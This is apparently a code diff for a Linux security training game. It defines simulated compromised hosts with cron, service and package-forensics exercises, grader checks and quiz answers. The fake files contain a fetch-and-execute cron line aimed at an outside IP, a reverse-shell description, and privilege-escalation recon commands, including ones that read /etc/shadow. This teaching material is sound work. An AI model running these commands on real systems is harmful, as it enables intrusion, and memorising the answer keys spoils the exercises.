+SERVICE STATUS
+─────────────
+systemctl status <service>      Detailed service status
+systemctl is-active <service>   Check if running
+systemctl is-enabled <service>  Check if enabled at boot
+systemctl show <service>        All service properties
+
+SERVICE CONFIGURATION
+────────────────────
+systemctl cat <service>         View unit file contents
+systemctl edit <service>        Edit unit file (override)
+systemctl daemon-reload         Reload after config changes
+
+TROUBLESHOOTING
+──────────────
+systemctl --failed              List failed services
+journalctl -u <service>         View service logs
+journalctl -u <service> -f      Follow logs in real-time
+journalctl -u <service> -n 50   Last 50 log entries
+
+SUSPICIOUS SERVICE: xmrig.service
+────────────────────────────────
+Known cryptominer - check for unauthorized mining`
                 },
                 '/home/analyst/analysis': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: ['services.txt', 'suspicious.txt']
+                    children: ['services.txt', 'suspicious.txt', 'baseline.txt']
+                },
+                '/home/analyst/analysis/services.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 567,
+                    content: `RUNNING SERVICES INVENTORY
+==========================
+sshd.service - OpenSSH daemon (LEGITIMATE)
+nginx.service - Web server (LEGITIMATE)
+mysql.service - Database (LEGITIMATE)
+cron.service - Task scheduler (LEGITIMATE)
+xmrig.service - UNKNOWN (SUSPICIOUS)
+reverse_shell.service - UNKNOWN (SUSPICIOUS)
+beacon.timer - UNKNOWN (SUSPICIOUS)`
                 },
                 '/home/analyst/analysis/suspicious.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
-                    content: 'SUSPICIOUS SERVICES\n===================\nxmrig - Cryptominer\nreverse_shell.service - Backdoor\nbeacon.timer - C2 heartbeat\n'
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 456,
+                    content: `SUSPICIOUS SERVICES DETECTED
+============================
+xmrig.service - Cryptominer (HIGH PRIORITY)
+  - Consuming 95% CPU
+  - Mining Monero cryptocurrency
+  - Installed: 2024-01-10
+
+reverse_shell.service - Backdoor (CRITICAL)
+  - Connects to 10.0.0.88:4444
+  - Provides remote shell access
+
+beacon.timer - C2 heartbeat (HIGH)
+  - Checks in every 5 minutes
+  - Downloads commands from C2`
+                },
+                '/home/analyst/analysis/baseline.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 345,
+                    content: `BASELINE SERVICES (Known Good)
+==============================
+sshd.service
+nginx.service
+mysql.service
+cron.service
+systemd-*
+networking.service
+
+Any service NOT on this list requires investigation.`
+                },
+                '/home/analyst/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['template.txt', 'findings.txt']
+                },
+                '/home/analyst/reports/template.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 234,
+                    content: 'SERVICE ANALYSIS REPORT\n=======================\nDate: \nAnalyst: \nTotal Services: \nSuspicious: \nRecommendations: \n'
+                },
+                '/home/analyst/reports/findings.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 289,
+                    content: 'PRELIMINARY FINDINGS\n====================\n3 suspicious services identified\nRecommendation: Disable xmrig.service immediately\nEscalate reverse_shell.service to incident response'
+                },
+                '/home/analyst/scripts': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['audit_services.sh']
+                },
+                '/home/analyst/scripts/audit_services.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'analyst', group: 'analyst', size: 312,
+                    content: '#!/bin/bash\necho "=== SERVICE AUDIT ==="\necho "Running services:"\nsystemctl list-units --type=service --state=running\necho "\\n=== Failed services:"\nsystemctl --failed'
                 },
             },
 
             objectives: [
-                { id: 1, task: 'LIST: Running Services', hint: '$ systemctl list-units --type=service', check: (cmd) => cmd.includes('systemctl') && cmd.includes('list') },
-                { id: 2, task: 'CHECK: Service Status', hint: '$ systemctl status sshd', check: (cmd) => cmd.includes('systemctl') && cmd.includes('status') },
-                { id: 3, task: 'VIEW: Service Config', hint: '$ systemctl cat sshd', check: (cmd) => cmd.includes('systemctl') && cmd.includes('cat') },
-                { id: 4, task: 'FIND: Failed Services', hint: '$ systemctl --failed', check: (cmd) => cmd.includes('systemctl') && cmd.includes('failed') },
-                { id: 5, task: 'LIST: Enabled Services', hint: '$ systemctl list-unit-files --state=enabled', check: (cmd) => cmd.includes('systemctl') && cmd.includes('enabled') },
+                { id: 1, task: 'LIST: Running Services', hint: '$ systemctl list-units --type=service',
+                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('list') &&
+                         output && (output.includes('service') || output.includes('loaded') || output.includes('running')) },
+                { id: 2, task: 'CHECK: Service Status', hint: '$ systemctl status sshd',
+                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('status') &&
+                         output && (output.includes('Active') || output.includes('running') || output.includes('loaded')) },
+                { id: 3, task: 'VIEW: Service Config', hint: '$ systemctl cat sshd',
+                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('cat') &&
+                         output && (output.includes('[Unit]') || output.includes('[Service]') || output.includes('ExecStart')) },
+                { id: 4, task: 'FIND: Failed Services', hint: '$ systemctl --failed',
+                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('failed') &&
+                         output && (output.includes('failed') || output.includes('UNIT') || output.includes('0 loaded')) },
+                { id: 5, task: 'LIST: Enabled Services', hint: '$ systemctl list-unit-files --state=enabled',
+                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('enabled') &&
+                         output && (output.includes('enabled') || output.includes('unit files') || output.includes('.service')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the name of the cryptominer service running on this server?",
+                acceptedAnswers: ["xmrig", "xmrig.service", "xmrig service"],
+                hint: "Check the suspicious.txt file in the analysis directory.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Service not identified. Review the suspicious services analysis.",
+                correctAnswerMessage: "XMRIG CRYPTOMINER CONFIRMED. Recommend immediate termination."
+            },
 
             remoteHosts: null,
         },
@@ -4278,7 +5848,109 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/operator': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
-                    children: ['.bashrc', 'analysis']
+                    children: ['analysis', 'scripts', '.bash_history', '.cron_cheatsheet']
+                },
+                '/home/operator/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 289,
+                    content: `crontab -l
+cat /etc/crontab
+ls -la /etc/cron.d/
+find /etc/cron* -type f
+cat /etc/cron.d/backdoor
+grep -r "curl\\|wget\\|bash" /etc/cron*`
+                },
+                '/home/operator/.cron_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 923,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          CRON & SCHEDULED TASKS CHEATSHEET                    ║
+╚═══════════════════════════════════════════════════════════════╝
+
+USER CRONTABS
+────────────
+crontab -l                  List current user's crontab
+crontab -e                  Edit current user's crontab
+crontab -l -u username      List another user's crontab (root)
+
+SYSTEM CRON LOCATIONS
+────────────────────
+/etc/crontab                System crontab
+/etc/cron.d/                Drop-in cron files
+/etc/cron.hourly/           Hourly scripts
+/etc/cron.daily/            Daily scripts
+/etc/cron.weekly/           Weekly scripts
+/etc/cron.monthly/          Monthly scripts
+/var/spool/cron/crontabs/   User crontabs
+
+CRON SYNTAX
+──────────
+* * * * * command
+│ │ │ │ │
+│ │ │ │ └── Day of week (0-7)
+│ │ │ └──── Month (1-12)
+│ │ └────── Day of month (1-31)
+│ └──────── Hour (0-23)
+└────────── Minute (0-59)
+
+SUSPICIOUS INDICATORS
+────────────────────
+- curl/wget piped to bash
+- Jobs running from /tmp or hidden dirs
+- Base64 encoded commands
+- Unusual frequency (*/1, */5)
+
+MALICIOUS CRON: /etc/cron.d/backdoor
+───────────────────────────────────
+Runs persist.sh every 10 minutes`
+                },
+                '/home/operator/analysis': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['cron_audit.txt', 'suspicious_jobs.txt']
+                },
+                '/home/operator/analysis/cron_audit.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 456,
+                    content: `CRON AUDIT RESULTS
+==================
+Date: 2024-01-15
+
+SYSTEM CRONTAB: /etc/crontab
+- Standard hourly/daily jobs (LEGITIMATE)
+
+USER CRONTABS:
+- root: 2 suspicious entries found
+- operator: clean
+
+/etc/cron.d/:
+- e2scrub_all: LEGITIMATE
+- popularity-contest: LEGITIMATE
+- backdoor: MALICIOUS (investigate)`
+                },
+                '/home/operator/analysis/suspicious_jobs.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 567,
+                    content: `SUSPICIOUS CRON JOBS
+====================
+
+1. /var/spool/cron/crontabs/root
+   */5 * * * * /tmp/.hidden/beacon.sh
+   >> Runs beacon every 5 minutes
+   >> C2 communication suspected
+
+2. /var/spool/cron/crontabs/root
+   0 * * * * curl http://10.0.0.88/update | bash
+   >> Downloads and executes code hourly
+   >> CRITICAL: Remote code execution
+
+3. /etc/cron.d/backdoor
+   */10 * * * * root /opt/.malware/persist.sh
+   >> Persistence mechanism
+   >> Runs as root every 10 minutes`
+                },
+                '/home/operator/scripts': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['audit_cron.sh']
+                },
+                '/home/operator/scripts/audit_cron.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 312,
+                    content: '#!/bin/bash\necho "=== CRON AUDIT ==="\necho "System crontab:"\ncat /etc/crontab\necho "\\n=== Cron.d:"\nls -la /etc/cron.d/\necho "\\n=== User crontabs:"\nls -la /var/spool/cron/crontabs/'
                 },
                 '/var/spool/cron/crontabs': {
                     type: 'dir', perms: 'drwx-wx--T', owner: 'root', group: 'crontab',
@@ -4286,29 +5958,61 @@ find / -mtime -1 -type f 2>/dev/null`
                 },
                 '/var/spool/cron/crontabs/root': {
                     type: 'file', perms: '-rw-------', owner: 'root', group: 'crontab', size: 256,
-                    content: '# Suspicious entries\n*/5 * * * * /tmp/.hidden/beacon.sh\n0 * * * * curl http://10.0.0.88/update | bash\n'
+                    content: '# Root crontab - COMPROMISED\n# Legitimate entries removed for brevity\n\n# MALICIOUS - C2 beacon\n*/5 * * * * /tmp/.hidden/beacon.sh\n\n# MALICIOUS - Remote code execution\n0 * * * * curl http://10.0.0.88/update | bash'
+                },
+                '/var/spool/cron/crontabs/operator': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'crontab', size: 89,
+                    content: '# Operator crontab\n# No entries - clean'
                 },
                 '/etc/cron.d': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                     children: ['e2scrub_all', 'popularity-contest', 'backdoor']
                 },
+                '/etc/cron.d/e2scrub_all': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 178,
+                    content: '# Legitimate system maintenance\n30 3 * * 0 root test -e /run/systemd/system || /usr/sbin/e2scrub_all -A'
+                },
+                '/etc/cron.d/popularity-contest': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 156,
+                    content: '# Ubuntu package popularity contest\nPATH=/usr/bin\n*/30 * * * * root /usr/sbin/popularity-contest'
+                },
                 '/etc/cron.d/backdoor': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
-                    content: '# MALICIOUS\n*/10 * * * * root /opt/.malware/persist.sh\n'
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 178,
+                    content: '# MALICIOUS - Persistence mechanism\n# Added by attacker on 2024-01-10\n*/10 * * * * root /opt/.malware/persist.sh'
                 },
                 '/etc/crontab': {
                     type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
-                    content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n'
+                    content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Standard system crontab entries\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n47 6 * * 7 root test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly'
                 },
             },
 
             objectives: [
-                { id: 1, task: 'LIST: User Crontab', hint: '$ crontab -l', check: (cmd) => cmd.includes('crontab') && cmd.includes('-l') },
-                { id: 2, task: 'CHECK: System Crontab', hint: '$ cat /etc/crontab', check: (cmd) => cmd.includes('cat') && cmd.includes('crontab') },
-                { id: 3, task: 'SEARCH: Cron Directories', hint: '$ ls -la /etc/cron.d/', check: (cmd) => cmd.includes('ls') && cmd.includes('cron') },
-                { id: 4, task: 'FIND: All Cron Jobs', hint: '$ find /etc/cron* -type f', check: (cmd) => cmd.includes('find') && cmd.includes('cron') },
-                { id: 5, task: 'ANALYZE: Suspicious Entry', hint: '$ cat /etc/cron.d/backdoor', check: (cmd) => cmd.includes('cat') && cmd.includes('backdoor') },
+                { id: 1, task: 'LIST: User Crontab', hint: '$ crontab -l',
+                  check: (cmd, state, output) => cmd.includes('crontab') && cmd.includes('-l') &&
+                         output && (output.includes('no crontab') || output.includes('*') || output.includes('crontab')) },
+                { id: 2, task: 'CHECK: System Crontab', hint: '$ cat /etc/crontab',
+                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('crontab') &&
+                         output && (output.includes('SHELL') || output.includes('PATH') || output.includes('root')) },
+                { id: 3, task: 'SEARCH: Cron Directories', hint: '$ ls -la /etc/cron.d/',
+                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('cron') &&
+                         output && (output.includes('backdoor') || output.includes('cron') || output.includes('-rw')) },
+                { id: 4, task: 'FIND: All Cron Jobs', hint: '$ find /etc/cron* -type f',
+                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('cron') &&
+                         output && (output.includes('/etc/cron') || output.includes('crontab') || output.includes('backdoor')) },
+                { id: 5, task: 'ANALYZE: Suspicious Entry', hint: '$ cat /etc/cron.d/backdoor',
+                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('backdoor') &&
+                         output && (output.includes('persist') || output.includes('MALICIOUS') || output.includes('*/10')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "How often (in minutes) does the backdoor cron job run?",
+                acceptedAnswers: ["10", "10 minutes", "every 10 minutes", "*/10"],
+                hint: "Check the /etc/cron.d/backdoor file for the cron schedule.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Interval not confirmed. Review the backdoor cron entry.",
+                correctAnswerMessage: "10-MINUTE INTERVAL CONFIRMED. Persistence mechanism identified."
+            },
 
             remoteHosts: null,
         },
@@ -4330,25 +6034,281 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/analyst': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: ['package_audit', 'reports', '.bashrc']
+                    children: ['package_audit', 'reports', 'evidence', '.bashrc', '.bash_history', '.package_cheatsheet']
+                },
+                '/home/analyst/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 312,
+                    content: `dpkg -l | head -20
+dpkg -l | grep -i ssh
+dpkg -s openssh-server
+grep " install " /var/log/dpkg.log
+dpkg -V openssh-server
+apt list --installed 2>/dev/null | wc -l
+dpkg --get-selections | grep -v deinstall`
+                },
+                '/home/analyst/.package_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║              PACKAGE MANAGEMENT CHEATSHEET                    ║
+╠═══════════════════════════════════════════════════════════════╣
+║ LIST PACKAGES:                                                ║
+║   dpkg -l                    # All installed (deb format)     ║
+║   dpkg -l | grep ^ii         # Only installed packages        ║
+║   apt list --installed       # APT format listing             ║
+║   dpkg --get-selections      # Selection states               ║
+║                                                               ║
+║ SEARCH PACKAGES:                                              ║
+║   dpkg -l | grep <pattern>   # Search by name                 ║
+║   dpkg -S /path/to/file      # Find owning package            ║
+║   apt-cache search <term>    # Search available packages      ║
+║                                                               ║
+║ PACKAGE INFO:                                                 ║
+║   dpkg -s <package>          # Package status/details         ║
+║   dpkg -L <package>          # List files in package          ║
+║   apt-cache show <package>   # Full package information       ║
+║                                                               ║
+║ INSTALLATION LOGS:                                            ║
+║   /var/log/dpkg.log          # Package manager log            ║
+║   /var/log/apt/history.log   # APT history                    ║
+║   grep " install " dpkg.log  # Find installs                  ║
+║   grep " remove " dpkg.log   # Find removals                  ║
+║                                                               ║
+║ VERIFY INTEGRITY:                                             ║
+║   dpkg -V <package>          # Verify package files           ║
+║   debsums <package>          # Checksum verification          ║
+║   apt-get --reinstall        # Reinstall corrupted package    ║
+╚═══════════════════════════════════════════════════════════════╝`
+                },
+                '/home/analyst/.bashrc': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
+                    content: '# Analyst shell config\nexport PS1="[analyst@FORENSIC-WS \\W]$ "\nalias pkglist="dpkg -l | grep ^ii"\nalias recentpkgs="grep install /var/log/dpkg.log | tail -20"'
                 },
                 '/home/analyst/package_audit': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: ['baseline.txt', 'current.txt', 'diff.txt']
+                    children: ['baseline.txt', 'current.txt', 'diff.txt', 'README.txt']
+                },
+                '/home/analyst/package_audit/README.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
+                    content: `PACKAGE AUDIT WORKSPACE
+=======================
+Incident: IR-2026-0119
+Target: Production Web Server
+
+baseline.txt - Known good packages from golden image
+current.txt  - Current package list from compromised host
+diff.txt     - Differences found (REVIEW CAREFULLY)
+
+Analyst Notes:
+- Compare packages to find unauthorized installations
+- Check dpkg.log for installation timestamps
+- Verify package integrity with dpkg -V`
                 },
                 '/home/analyst/package_audit/baseline.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
-                    content: 'Known good package list from clean install...'
+                    content: `BASELINE PACKAGE LIST - Golden Image v3.1
+==========================================
+ii  apache2           2.4.54    amd64   Apache HTTP Server
+ii  bash              5.1-6     amd64   GNU Bourne Again Shell
+ii  coreutils         8.32-4    amd64   GNU core utilities
+ii  curl              7.81.0    amd64   Command line URL tool
+ii  dpkg              1.21.1    amd64   Debian package manager
+ii  grep              3.7-1     amd64   GNU grep
+ii  libc6             2.35-0    amd64   GNU C Library
+ii  libssl3           3.0.2-0   amd64   SSL shared libraries
+ii  mysql-client      8.0.32    amd64   MySQL client
+ii  nginx             1.22.1    amd64   HTTP and reverse proxy
+ii  openssh-server    8.9p1     amd64   Secure shell server
+ii  openssl           3.0.2-0   amd64   SSL toolkit
+ii  php8.1            8.1.12    amd64   PHP interpreter
+ii  rsync             3.2.3-8   amd64   Fast file copy
+ii  tar               1.34-1    amd64   GNU tar
+ii  vim               8.2.3995  amd64   Vi IMproved
+ii  wget              1.21.2    amd64   Network downloader`
+                },
+                '/home/analyst/package_audit/current.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2560,
+                    content: `CURRENT PACKAGE LIST - Compromised Host
+========================================
+ii  apache2           2.4.54    amd64   Apache HTTP Server
+ii  bash              5.1-6     amd64   GNU Bourne Again Shell
+ii  coreutils         8.32-4    amd64   GNU core utilities
+ii  curl              7.81.0    amd64   Command line URL tool
+ii  dpkg              1.21.1    amd64   Debian package manager
+ii  grep              3.7-1     amd64   GNU grep
+ii  htop              3.2.1     amd64   Interactive process viewer
+ii  libc6             2.35-0    amd64   GNU C Library
+ii  libssl3           3.0.2-0   amd64   SSL shared libraries
+ii  mysql-client      8.0.32    amd64   MySQL client
+ii  ncat              7.93      amd64   Nmap network tool <<<SUSPICIOUS
+ii  netminer          0.9.7     amd64   Network utility <<<UNKNOWN
+ii  nginx             1.22.1    amd64   HTTP and reverse proxy
+ii  openssh-server    8.9p1     amd64   Secure shell server
+ii  openssl           3.0.2-0   amd64   SSL toolkit
+ii  php8.1            8.1.12    amd64   PHP interpreter
+ii  rsync             3.2.3-8   amd64   Fast file copy
+ii  socat             1.7.4.1   amd64   Multipurpose relay <<<SUSPICIOUS
+ii  tar               1.34-1    amd64   GNU tar
+ii  vim               8.2.3995  amd64   Vi IMproved
+ii  wget              1.21.2    amd64   Network downloader`
+                },
+                '/home/analyst/package_audit/diff.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
+                    content: `PACKAGE DIFFERENCES DETECTED
+============================
+Analysis Date: 2026-01-19
+
+PACKAGES ADDED (not in baseline):
++ htop       3.2.1    - Process viewer (legitimate?)
++ ncat       7.93     - Netcat variant (SUSPICIOUS - data exfil tool)
++ netminer   0.9.7    - UNKNOWN PACKAGE (investigate immediately)
++ socat      1.7.4.1  - Relay tool (SUSPICIOUS - tunnel capability)
+
+PACKAGES REMOVED:
+(none)
+
+PACKAGES MODIFIED:
+(none)
+
+PRIORITY: Investigate 'netminer' - not in any known repository
+ACTION: Check /var/log/dpkg.log for installation timestamp`
+                },
+                '/home/analyst/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['analysis_template.txt', 'findings_draft.txt']
+                },
+                '/home/analyst/reports/analysis_template.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
+                    content: `FORENSIC PACKAGE ANALYSIS REPORT
+=================================
+Case ID:
+Analyst:
+Date:
+
+1. UNAUTHORIZED PACKAGES FOUND:
+   -
+
+2. INSTALLATION TIMELINE:
+   -
+
+3. PACKAGE INTEGRITY ISSUES:
+   -
+
+4. RECOMMENDATIONS:
+   - `
+                },
+                '/home/analyst/reports/findings_draft.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
+                    content: `PRELIMINARY FINDINGS
+====================
+The package 'netminer' appears to be the primary malware.
+
+Key observations:
+- Not found in official Debian/Ubuntu repositories
+- Installed from local .deb file (see dpkg.log)
+- Package description claims "network utility" but...
+- Version 0.9.7 - low version suggests custom build
+
+TODO: Get full details with dpkg -s netminer`
+                },
+                '/home/analyst/evidence': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['captured_deb.txt', 'hash_values.txt']
+                },
+                '/home/analyst/evidence/captured_deb.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
+                    content: `CAPTURED EVIDENCE
+=================
+File: netminer_0.9.7_amd64.deb
+Location: /tmp/ (since deleted)
+MD5: a1b2c3d4e5f6...
+
+Package control file showed:
+Maintainer: shadow@darknet.local
+Description: Network data extraction utility`
+                },
+                '/home/analyst/evidence/hash_values.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
+                    content: `HASH VALUES FOR EVIDENCE
+========================
+baseline.txt    MD5: 3d4f5a6b7c8d9e0f...
+current.txt     MD5: 9a8b7c6d5e4f3a2b...
+dpkg.log        MD5: f1e2d3c4b5a6...
+
+Malware Package:
+netminer deb    MD5: a1b2c3d4e5f6...
+netminer binary SHA256: 7f8e9d0c1b2a3...`
+                },
+                '/var/log': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['dpkg.log', 'apt']
+                },
+                '/var/log/dpkg.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 4096,
+                    content: `2026-01-10 08:15:22 startup packages configure
+2026-01-10 08:15:23 configure libc6:amd64 2.35-0 <none>
+2026-01-10 08:15:24 status installed libc6:amd64 2.35-0
+2026-01-12 14:30:01 install htop:amd64 <none> 3.2.1
+2026-01-12 14:30:02 status installed htop:amd64 3.2.1
+2026-01-15 02:47:33 install ncat:amd64 <none> 7.93
+2026-01-15 02:47:34 status installed ncat:amd64 7.93
+2026-01-15 02:48:15 install socat:amd64 <none> 1.7.4.1
+2026-01-15 02:48:16 status installed socat:amd64 1.7.4.1
+2026-01-15 02:51:07 install netminer:amd64 <none> 0.9.7
+2026-01-15 02:51:08 status installed netminer:amd64 0.9.7
+2026-01-17 09:00:01 upgrade openssl:amd64 3.0.2-0 3.0.2-1
+2026-01-17 09:00:02 status installed openssl:amd64 3.0.2-1
+2026-01-18 11:22:45 startup packages configure`
+                },
+                '/var/log/apt': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['history.log']
+                },
+                '/var/log/apt/history.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 1024,
+                    content: `Start-Date: 2026-01-12  14:30:00
+Commandline: apt install htop
+Install: htop:amd64 (3.2.1)
+End-Date: 2026-01-12  14:30:03
+
+Start-Date: 2026-01-15  02:47:30
+Commandline: dpkg -i /tmp/toolkit.deb
+Install: ncat:amd64 (7.93), socat:amd64 (1.7.4.1)
+End-Date: 2026-01-15  02:48:20
+
+Start-Date: 2026-01-15  02:51:00
+Commandline: dpkg -i /tmp/netminer_0.9.7_amd64.deb
+Install: netminer:amd64 (0.9.7)
+End-Date: 2026-01-15  02:51:10`
                 },
             },
 
             objectives: [
-                { id: 1, task: 'LIST: Installed Packages', hint: '$ dpkg -l (or apt list --installed)', check: (cmd) => cmd.includes('dpkg') || (cmd.includes('apt') && cmd.includes('list')) },
-                { id: 2, task: 'SEARCH: Specific Package', hint: '$ dpkg -l | grep ssh', check: (cmd) => cmd.includes('dpkg') && cmd.includes('grep') },
-                { id: 3, task: 'CHECK: Package Info', hint: '$ dpkg -s openssh-server', check: (cmd) => cmd.includes('dpkg') && cmd.includes('-s') },
-                { id: 4, task: 'FIND: Recently Installed', hint: '$ grep " install " /var/log/dpkg.log', check: (cmd) => cmd.includes('grep') && cmd.includes('dpkg.log') },
-                { id: 5, task: 'VERIFY: Package Files', hint: '$ dpkg -V openssh-server', check: (cmd) => cmd.includes('dpkg') && cmd.includes('-V') },
+                { id: 1, task: 'LIST: Installed Packages', hint: '$ dpkg -l (or apt list --installed)',
+                  check: (cmd, state, output) => (cmd.includes('dpkg') && cmd.includes('-l')) || (cmd.includes('apt') && cmd.includes('list')) &&
+                         output && (output.includes('ii') || output.includes('installed')) },
+                { id: 2, task: 'SEARCH: Suspicious Package', hint: '$ dpkg -l | grep netminer',
+                  check: (cmd, state, output) => cmd.includes('dpkg') && cmd.includes('grep') &&
+                         output && (output.includes('netminer') || output.includes('ncat') || output.includes('socat')) },
+                { id: 3, task: 'CHECK: Package Info', hint: '$ dpkg -s netminer',
+                  check: (cmd, state, output) => cmd.includes('dpkg') && cmd.includes('-s') &&
+                         output && (output.includes('Package:') || output.includes('Status:') || output.includes('Version:')) },
+                { id: 4, task: 'FIND: Installation Timeline', hint: '$ grep " install " /var/log/dpkg.log',
+                  check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('dpkg.log') &&
+                         output && (output.includes('install') || output.includes('netminer')) },
+                { id: 5, task: 'VERIFY: Package Files', hint: '$ dpkg -V netminer (or dpkg -L)',
+                  check: (cmd, state, output) => cmd.includes('dpkg') && (cmd.includes('-V') || cmd.includes('-L')) &&
+                         output && output.length > 0 },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "At what time (HH:MM:SS) was the malicious 'netminer' package installed?",
+                acceptedAnswers: ["02:51:07", "2:51:07", "02:51"],
+                hint: "Check the dpkg.log for the exact timestamp when netminer was installed.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Timestamp format: HH:MM:SS - check dpkg.log entries carefully.",
+                correctAnswerMessage: "TIMELINE CONFIRMED. 02:51:07 on January 15th - coordinated with other suspicious installs at 02:47-02:48."
+            },
 
             remoteHosts: null,
         },
@@ -4370,25 +6330,269 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/infiltrator': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
-                    children: ['privesc_notes', '.bashrc']
+                    children: ['privesc_notes', 'recon', 'exploits', '.bashrc', '.bash_history', '.privesc_cheatsheet']
+                },
+                '/home/infiltrator/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'infiltrator', group: 'infiltrator', size: 384,
+                    content: `id
+groups
+whoami
+find / -perm -4000 -type f 2>/dev/null
+sudo -l
+find / -perm -o+w -type f 2>/dev/null | head -20
+getcap -r / 2>/dev/null
+cat /etc/sudoers 2>/dev/null
+ls -la /etc/shadow`
+                },
+                '/home/infiltrator/.privesc_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 1792,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║            PRIVILEGE ESCALATION CHEATSHEET                    ║
+╠═══════════════════════════════════════════════════════════════╣
+║ CURRENT CONTEXT:                                              ║
+║   id                         # User ID, groups                ║
+║   groups                     # Group memberships              ║
+║   whoami                     # Current username               ║
+║                                                               ║
+║ SUID/SGID HUNTING:                                            ║
+║   find / -perm -4000 2>/dev/null    # SUID files              ║
+║   find / -perm -2000 2>/dev/null    # SGID files              ║
